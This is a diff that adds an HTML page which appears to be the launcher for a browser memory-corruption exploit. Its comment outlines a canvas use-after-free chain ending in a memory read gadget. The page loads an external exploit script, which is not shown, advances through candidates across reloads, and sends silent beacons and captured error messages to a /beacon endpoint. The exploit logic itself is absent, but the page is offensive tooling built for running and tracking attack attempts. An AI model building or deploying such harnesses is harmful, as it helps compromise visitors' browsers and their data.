@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+</head><body>
+<!-- p490: canvas UAF -> LIFO AB reclaim -> forged stateStack -> lineWidth read gadget.
+     Blank by design. One candidate per load (localStorage cursor auto-advances).
+     Miss = white page: just reopen the Guide for the next candidate. -->
+<img src="/beacon/V489-PAGEIMG?t=1" width="1" height="1" style="display:none" alt="">
+<script>window.onerror=function(m,u,l){try{var x=new XMLHttpRequest();x.open('POST','/beacon/V489-HTMLERR',true);x.send(String(m).substring(0,80)+'@'+l);}catch(e){}};</script>
+<script src="p490-forged-state.js"></script>
+</body></html>
